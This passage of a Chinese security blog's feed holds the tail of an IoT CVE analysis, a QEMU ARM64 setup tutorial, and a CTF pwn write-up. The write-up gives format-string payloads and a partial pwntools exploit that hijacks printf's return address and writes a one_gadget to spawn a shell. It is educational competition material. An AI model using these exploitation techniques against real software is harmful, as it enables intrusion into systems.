     uf_log,</span><br><span class="line">          <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, need [number][.][number]!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;detect_remoteIp_invalid&quot;</span>,</span><br><span class="line">          <span class="number">273</span>,</span><br><span class="line">          v5);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="参考信息"><a href="#参考信息" class="headerlink" title="参考信息"></a>参考信息</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-38902">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-38902</a></p>
<p><a href="https://gist.github.com/ZIKH26/18693c67ee7d2f8d2c60231b19194c37">https://gist.github.com/ZIKH26/18693c67ee7d2f8d2c60231b19194c37</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
      </tags>
  </entry>
  <entry>
    <title>QEMU搭建ARM64环境</title>
    <url>/posts/3d9490d.html</url>
    <content><![CDATA[<p>已经配置好的环境：<a href="https://drive.google.com/file/d/1FcbCkfGuHlvohGlzA-HRRyM8izqhHALE/view?usp=sharing">下载链接</a> (使用方法：先执行 <code>net.sh</code> 再运行 <code>start.sh</code> 即可)</p>
<p>参考文章：<a href="https://www.diozero.com/boards/qemuaarch64_bullseye.html">Building a Debian Bullseye QEMU image for AARCH64 | diozero</a></p>
<p>大概思路：先下载安装程序的基本文件，联网安装完之后从磁盘文件中提取出需要的 <code>initrd.img</code> 和 <code>vmlinuz</code> 文件。 <code>QEMU</code> 依赖提取的文件构建出 <code>aarch64</code> 环境。</p>
<span id="more"></span>

<h3 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h3><p>创建磁盘文件并下载内核镜像、内存盘镜像文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img create -f qcow2 debian-3607-aarch64.qcow2 20G</span><br><span class="line">wget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gz</span><br><span class="line">wget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/debian-installer/arm64/linux</span><br><span class="line">wget http://ftp.au.debian.org/debian/dists/bullseye/main/installer-arm64/current/images/netboot/mini.iso</span><br></pre></td></tr></table></figure>



<p>执行 <code>qemu</code> 启动脚本前，先确创建出 <code>tap0</code> 接口并将其添加至网桥（名称可能会根据具体情况进行修改），因为接下来会通过网络来下载和安装完整的系统，必须要实现 <code>qemu</code> 的网络通信。依次执行下面的命令。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">sudo ip tuntap add dev tap0 mode tap</span><br><span class="line">sudo ip link <span class="built_in">set</span> tap0 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br><span class="line">sudo chmod <span class="number">666</span> /dev/net/tun</span><br></pre></td></tr></table></figure>



<p>下面是 <code>qemu</code> 的启动脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo qemu-system-aarch64 -M virt -cpu cortex-a53 -m 1G -kernel ./linux -initrd ./initrd.gz \</span><br><span class="line">    -hda debian-3607-aarch64.qcow2 -append &quot;console=ttyAMA0&quot; \</span><br><span class="line">    -drive file=mini.iso,id=cdrom,if=none,media=cdrom \</span><br><span class="line">    -device virtio-scsi-device -device scsi-cd,drive=cdrom -nographic \</span><br><span class="line">    -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-device,netdev=net0</span><br></pre></td></tr></table></figure>



<h3 id="下载-amp-amp-安装阶段"><a href="#下载-amp-amp-安装阶段" class="headerlink" title="下载&amp;&amp;安装阶段"></a>下载&amp;&amp;安装阶段</h3><p>当执行启动脚本后，会看到这个界面，这说明正常进入了安装界面。选择 <code>English</code> 并敲击回车继续往下进行</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519172730758.png" alt="image-20240519172730758"></p>
<p>选香港</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519172748706.png" alt="image-20240519172748706"></p>
<p>键盘布局随便，我选了 <code>Chinese</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519172831617.png" alt="image-20240519172831617"></p>
<p>这里会自动尝试配置网络</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519172957528.png" alt="image-20240519172957528"></p>
<p>如果忘记创建 <code>tap0</code> 接口或者没有成功将 <code>tap0</code> 接口添加到网桥，那么会出现自动配置网络失败的情况。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519173017122.png" alt="image-20240519173017122"></p>
<p>这里可以选择自行手动配置，但我建议最后先将 <code>qemu</code> 的网络通信后，让它自动获取。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519173029036.png" alt="image-20240519173029036"></p>
<p>遇见上面的情况就需要重新检查网络接口以及网桥的状态，如果是下面的情况则说明一切正常。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519174328064.png" alt="image-20240519174328064"></p>
<p>默认为空继续</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519174345556.png" alt="image-20240519174345556"></p>
<p>选香港</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519174408193.png" alt="image-20240519174408193"></p>
<p>默认为空继续</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519174500123.png" alt="image-20240519174500123"></p>
<p>设置代理，默认为空即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519174511531.png" alt="image-20240519174511531"></p>
<p>设置 <code>root</code> 用户的密码</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519174905966.png" alt="image-20240519174905966"></p>
<p>重复刚才的密码</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519174927529.png" alt="image-20240519174927529"></p>
<p>创建新的用户</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175105696.png" alt="image-20240519175105696"></p>
<p>和上面的一样即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175137423.png" alt="image-20240519175137423"></p>
<p>输入新建用户的密码</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175158591.png" alt="image-20240519175158591"></p>
<p>重复密码</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175210970.png" alt="image-20240519175210970"></p>
<p>下面四个步骤全部默认即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175337793.png" alt="image-20240519175337793"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175353589.png" alt="image-20240519175353589"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175442190.png" alt="image-20240519175442190"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175524650.png" alt="image-20240519175524650"></p>
<p>这里选择 <code>Yes</code> （默认是 <code>No</code> ）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519175612033.png" alt="image-20240519175612033"></p>
<p>然后会安装大概一两个小时。弹出来这个，选择 <code>Yes</code> 。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519214316884.png" alt="image-20240519214316884"></p>
<p>什么都不用主动勾选（默认会有 <code>SSH</code>），按 <code>Tab</code> 切换到 <code>Continue</code> 就行</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519214522645.png" alt="image-20240519214522645"></p>
<p>​	继续</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519215503055.png" alt="image-20240519215503055"></p>
<p>这里安装已经完成了，点击 <code>Continue</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519215657041.png" alt="image-20240519215657041"></p>
<p>再次看到这个最初的界面，就是已经安装完了（不需要再继续安装了），直接给这个窗口关了就行</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519220021950.png" alt="image-20240519220021950"></p>
<h3 id="从镜像提取文件"><a href="#从镜像提取文件" class="headerlink" title="从镜像提取文件"></a>从镜像提取文件</h3><p>现在要从 <code>qcow2</code> 镜像中提取出来 <code>Linux</code> 内核和 <code>initrd</code> ，将磁盘文件挂载出来，然后把 <code>vmlinuz-5.10.0-29-arm64</code> 以及 <code>initrd.img-5.10.0-29-arm64</code> 拷贝出来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo modprobe nbd</span><br><span class="line">sudo qemu-nbd -c /dev/nbd0 debian-3607-aarch64.qcow2</span><br><span class="line">sudo mount /dev/nbd0p2 /mnt </span><br><span class="line">sudo mount /dev/nbd0p1 /mnt/boot </span><br><span class="line">cp /mnt/boot/vmlinuz-5.10.0-29-arm64 ./</span><br><span class="line">cp /mnt/boot/initrd.img-5.10.0-29-arm64 ./</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519225438650.png" alt="image-20240519225438650"></p>
<h3 id="运行并实现网络通信"><a href="#运行并实现网络通信" class="headerlink" title="运行并实现网络通信"></a>运行并实现网络通信</h3><p>现在所有的文件都有了，接下来就是启动 <code>qemu</code> ，在此之前先创建出 <code>tap0</code> 接口并将其添加到 <code>virbr0</code> 网桥。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo ip tuntap add dev tap0 mode tap</span><br><span class="line">sudo ip link set tap0 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br><span class="line">sudo chmod 666 /dev/net/tun</span><br></pre></td></tr></table></figure>



<p>运行下面的启动脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo qemu-system-aarch64 -M virt -cpu cortex-a53 -m 1G -initrd ./initrd.img-5.10.0-29-arm64 \</span><br><span class="line">    -kernel ./vmlinuz-5.10.0-29-arm64 -append &quot;root=/dev/vda2 console=ttyAMA0&quot; \</span><br><span class="line">    -drive if=virtio,file=debian-3607-aarch64.qcow2,format=qcow2,id=hd \</span><br><span class="line">    -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -device virtio-net-pci,netdev=net0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>



<p>一切正常，此时让输入用户名和密码（安装时设置的）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519232417152.png" alt="image-20240519232417152"></p>
<p>进来应该是这样，此时的网卡还没有分出来 <code>ip</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519232514513.png" alt="image-20240519232514513"></p>
<p>给 <code>enp0s1</code> 网卡分一个 <code>ip</code> （取决于网桥 <code>virbr0</code> 在宿主机的哪个网段），再设置一下网关，最后启用该网卡。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip add add 192.168.122.130/24 dev enp0s1</span><br><span class="line">ip link set enp0s1 up</span><br><span class="line">ip route add default via 192.168.122.1</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519232759279.png" alt="image-20240519232759279"></p>
<p>配置好 <code>ip</code> 和网关后，此时可以 <code>ping</code> 通宿主机且可以访问互联网。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519232832316.png" alt="image-20240519232832316"></p>
<p>至此 <code>QEMU</code> 模拟 <code>ARM64</code> 架构系统完成。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240519234759740.png" alt="image-20240519234759740"></p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>探究</tag>
      </tags>
  </entry>
  <entry>
    <title>一次有趣的格式化字符串漏洞利用</title>
    <url>/posts/a523e26a.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是一道来自于 <strong>第六届强网拟态线下赛</strong> 有趣的 <code>PWN</code> 题，考察的是格式化字符串漏洞。我自认为格式化字符串的题目已经很熟练了，可在我的印象中格式化字符串漏洞无法一次向一个不存在的指针中写入数据，这道题颠覆了我的认知🥲。保护全开，只有一次 <strong>非栈上</strong> 格式化字符串漏洞利用的机会，之后触发 <code>_exit</code> 函数退出，唯一的信息是有栈地址末尾的两个字节。这可能是格式化字符串能利用的极限条件？！😶‍🌫️</p>
<span id="more"></span>

<p>题目链接：<a href="https://pan.baidu.com/s/1ouBtIRpfLBhzPQyi5116JA?pwd=y6sy">https://pan.baidu.com/s/1ouBtIRpfLBhzPQyi5116JA?pwd=y6sy</a><br>    提取码：y6sy</p>
<h2 id="程序保护"><a href="#程序保护" class="headerlink" title="程序保护"></a>程序保护</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312102141249.png" alt="image-20231210214133468"></p>
<p>这个 <code>canary</code> 是存在的（通过分析 <code>main</code> 函数的起始汇编代码或者 <code>gdb</code> 调试都能判断出来），但因为 <code>_exit</code> 直接从 <code>main</code> 函数退出的干扰，似乎 <code>checksec</code> 并没有检测到这个保护</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h] BYREF</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Gift: %x\n&quot;</span>, (<span class="type">unsigned</span> __int16)((<span class="type">unsigned</span> __int16)&amp;savedregs - <span class="number">12</span>));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序泄露了一个栈地址的末尾两个字节，随后是一个非栈上的格式化字符串漏洞，<code>printf</code> 函数执行完触发 <code>_exit</code> 函数（该函数只执行退出功能，不会清理 <code>IO</code> 流，这意味着无法劫持 <code>exit</code> 函数那样的内部函数指针）</p>
<p>在线下比赛的时候，我分析出应该是要用 <code>printf</code> 函数来劫持它自己的返回地址，除此之外没有任何一个劫持指针的机会了（可以搜一下 <strong>2023年金盾杯线上赛</strong> ，这个比赛的一个 <strong>PWN</strong> 题和本题有一些像，也是一次非栈上的格式化字符串漏洞的机会然后 <code>exit</code> ，但那个是走的 <code>libc</code> 正常的 <code>exit</code> 函数，里面有位于栈里的 <code>ld</code> 指针可以劫持  ）。<code>printf</code> 函数劫持自身返回地址的一个条件就是已知栈地址，如果再用一个栈里的残留栈地址来打的话，已知最后两个字节也够了。</p>
<p>可在我利用格式化字符串漏洞的印象中，是无法向一个不存在的指针中写入数据的。</p>
<p>假设现在有栈指针 <code>A=&gt;B=&gt;C=&gt;D</code> ，我可以用格式化字符通过 <code>B</code> 为跳板修改 <code>C</code> 为 <code>E</code>，那么修改后的链为 <code>A=&gt;B=&gt;E=&gt;F</code>，如果有第二次格式化字符串漏洞的话，我可以找到链 <code>B=&gt;E=&gt;F</code> 通过 <code>E</code> 为跳板，修改原本的 <code>F</code> 为 <code>G</code>。但这个操作无法用一次的格式化字符串漏洞完成，可能因为 <code>B=&gt;E=&gt;F</code> 这条链本身是不存在的，即使用格式化字符串漏洞做出了 <code>B=&gt;E=&gt;F</code> 这条链也无法同时再去改这条链上的指针😅</p>
<h2 id="一次格式化字符串去编辑一个不存在的指针"><a href="#一次格式化字符串去编辑一个不存在的指针" class="headerlink" title="一次格式化字符串去编辑一个不存在的指针"></a>一次格式化字符串去编辑一个不存在的指针</h2><p>赛后看到其他师傅的 <code>payload</code> ，我写了一个类似的</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((value-<span class="number">0xc</span>)-<span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span>-((value-<span class="number">0xc</span>))).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这个 <code>payload</code> 可以泄露出各种地址，并且一次就能劫持掉 <code>printf</code> 函数自身的返回地址</p>
<p><code>payload</code> 起始的 <code>9</code> 个 <code>%p</code> 好理解，后面 <code>%xxxc%hn</code> ，这个语法缺了 <code>$</code> 字符。<code>$</code> 代表可以指定参数，假如 <code>9$</code> 那么表示参数列表中第九个参数。通常用这一个特性去进行栈中任意指针地址写，但如果不加 <code>$</code> ，写入数据的参数位置就是按顺序来的，因为 <code>printf</code> 解析参数会根据 <code>%</code> 进行判断，在 <code>hn</code> 前面一共有 <code>11</code> 个 <code>%</code> ，所以这个 <code>%xxxc%hn</code> 会将 <code>xxx</code> 数据加上 <code>%p</code> 泄露的字符个数写入第十一个参数（<code>printf</code> 函数利用格式化字符串减去的应该是后五个寄存器，<code>rdi</code> 本身是一个字符串地址，<code>%</code> 占位符解析的是从 <code>rsi</code> 开始的，五个寄存器加上六个栈内存单元）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111504183.png" alt="image-20231211150425693" style="zoom:50%;" />



<p>上面的 <code>printf</code> 函数执行后，将原本 <code>0x7ffcd65f8988</code> 指向的 <code>0x7ffcd65fa31e</code> 改成了 <code>0x7ffcd65f8878</code> ，这个 <code>0x7ffcd65f8878</code> 指向的位置就是 <code>printf</code> 函数的返回地址（因为下图的 <code>printf</code> 函数已经执行完毕，所以看的不直观，但观察此时的 <code>rsp</code> 也能推测出 <code>printf</code> 函数的返回地址应该是位于 <code>0x7ffcd65f8878</code>）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111505355.png" alt="image-20231211150546027"></p>
<p>再用一个 <code>payload</code> 通过 <code>0x7ffcd65f8878</code> 修改掉 <code>printf</code> 函数的返回地址，这里有一个小细节。因为正常的返回地址是 <code>0x55be41f00250</code> ，假设我想劫持到 <code>0x55be41f00223</code> ，只需要修改一个字节即可，但格式化字符串任意地址写的时候，后面写入的字符量一定要比前面的大。假设有 <code>%30c%16$hhn%40c%26$hhn</code> ，这样写到栈顶偏移 <code>20</code> 的位置，写入的值是 <code>70</code> （<code>30+40</code> ，并非是 <code>40</code>）。</p>
<p>上面的 <code>payload</code> 为 <code>%p%p%p%p%xxxc%hn</code> 一定是远大于一个字节所能表示的范围，因此后面就要用截断的方式写进去。比如我想写一个字节 <code>0x23</code> ，就应该写 <code>0x100023-xxx</code> 后面用 <code>%hhn</code> 来截断掉前面的值，就留最后一个字节 <code>0x23</code> （<code>xxx</code> 为 <code>payload</code> 前面部分的字节数）</p>
<p>明白了上面的分析，将两部分的 <code>payload</code> 结合起来就是这样（后面补全 <code>0x100</code> 个字节是确保 <code>read</code> 不会把我两次发送的 <code>payload</code> 当成一次给读入了 ）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>%p<span class="number">&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=b<span class="number">&#x27;</span>%<span class="string">&#x27;+str((value-0xc)-90).encode()+b&#x27;</span>c%hn<span class="number">&#x27;</span></span><br><span class="line">payload+=b<span class="number">&#x27;</span>%<span class="string">&#x27;+str(0x100023-((value-0xc))).encode()+b&#x27;</span>c%<span class="number">39</span>$hhn<span class="number">&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>执行过 <code>__vfprintf_internal</code> 函数后，<code>printf</code> 的返回地址已经被改成了 <code>0x561e4dcc7223</code> ，这里回到了 <code>read</code> 函数之前</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111532028.png" alt="image-20231211153228363"></p>
<p>随后我重现了比赛时的操作，首先修改栈顶偏移 <code>5</code> 的栈链，将其指向 <code>printf</code> 函数的返回地址。再修改栈顶偏移 <code>0x21</code> 的指针（理论上此时已经指向 <code>printf</code> 函数的返回地址），从而控制 <code>printf</code> 返回地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111544487.png" alt="image-20231211154412789"></p>
<p><code>payload</code> 如下，在不考虑泄露地址的情况下，这个看起来应该和上文提到的 <code>payload</code> 等效</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((value-<span class="number">0xc</span>)).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span>-((value-<span class="number">0xc</span>))).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>但事实上在 <code>__vfprintf_internal</code> 函数执行后，仅仅是修改了第一部分的指针，确实做出了一个指向 <code>printf</code> 返回地址的指针，但第二部分通过刚刚做出的指针并没有成功修改掉 <code>printf</code> 函数的返回地址</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111551025.png" alt="image-20231211155145574" style="zoom: 67%;" />

<p>我不能确定是否和 <code>$</code> 指定参数有关。猜测：任意地址写用 <code>$</code> 指定写入和按参数顺序写入的操作是先后分开的，先按参数顺序写入指针后，再用 <code>$</code> 去在刚刚的指针基础上进行修改。<strong>注意：这仅仅是个猜测，真相应该去源码中找到答案</strong> （以后有机会的话，我应该会去分析 <code>printf</code> 函数的源码，来探究出这个答案，但可惜不是现在🤔）</p>
<h2 id="后续利用"><a href="#后续利用" class="headerlink" title="后续利用"></a>后续利用</h2><p>因为我本身对格式化字符串漏洞的利用较为熟悉，当知道上面的方法可以一次就劫持到 <code>printf</code> 函数返回地址，那么后续的思路就明朗了。首先把 <code>libc</code> 地址泄露出来，然后通过栈链去修改 <code>printf</code> 函数返回地址下面一个地址为 <code>one_gadget</code> （先调试一下，发现第二个 <code>one_gadget</code> 能用），布局好 <code>one_gadget</code> 后，最后一次修改 <code>printf</code> 函数返回地址为 <code>ret</code> 指令的地址，这样通过 <code>ret</code> 将 <code>one_gadget</code> 执行。</p>
<p>值得一提的是，程序中必须要存在两条栈链才能够利用成功。如下图所示，有两条三级栈指针。一条用来每次 <code>printf</code> 函数结束后劫持自身的返回地址，一条用来将 <code>one_gadget</code> 或 <code>system</code> 等地址写入到栈内存中（我最开始用 <code>ubuntu18.04</code> 做的，程序中只有一条栈链，本题如果只有一条栈链的话也是没办法做的）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202312111640224.png" alt="image-20231211164022356"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;fmt&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">value=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x121E</span>,<span class="number">0x1237</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((value-<span class="number">0xc</span>)-<span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span>-((value-<span class="number">0xc</span>))).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x100&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x10e1f2</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x1260</span></span><br><span class="line">log_addr(<span class="string">&#x27;base&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((value-<span class="number">4</span>))-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((one_gadget&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((value-<span class="number">4</span>+<span class="number">2</span>))-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((value-<span 